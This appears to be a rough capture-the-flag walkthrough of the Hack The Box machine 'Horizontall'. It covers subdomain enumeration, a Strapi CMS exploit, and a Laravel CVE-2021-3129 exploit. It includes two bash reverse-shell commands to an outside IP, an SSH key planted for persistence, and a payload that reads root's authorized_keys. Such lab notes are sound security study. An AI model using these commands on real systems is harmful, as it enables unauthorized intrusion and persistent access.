22/tcp open  ssh
80/tcp open  http

http://horizontall.htb

tried directoy brute forcing didnt find anything lets move on to dns


gobuster vhost -u horizontall.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
Found: api-prod.horizontall.htb (Status: 200) [Size: 413]



 curl -v http://horizontall.htb/js/app.c68eb462.js 
{getReviews:function(){var t=this;r.a.get("http://api-prod.horizontall.htb/reviews") we can see the other subdomain here. 

found version number 
Strapi CMS 3.0.0-beta.17.4
/admin/init


run exploit Found using searchsploit 
then past rev shell.
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.27/31337 0>&1'

netstat -ant found 8000, 1337, 

checkout 22-SSH
cd ~/
	mkdir .ssh
		echo "ssh-rsa AAAA...= bob@kali" > authorized_keys

chmod 600 id_rsa
ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb -N -v

now we can access that page on our machine. 


CVE-2021-3129_exploit
https://github.com/nth347/CVE-2021-3129_exploit

./exploit.py http://localhost:8000 Monolog/RCE1 'which nc && whoami && id && cat /root/.ssh/authorized_keys && /bin/bash -c "sh -i >& /dev/tcp/10.10.14.27/9080 0>&1"'

start another nc listener on port 9080 boom.
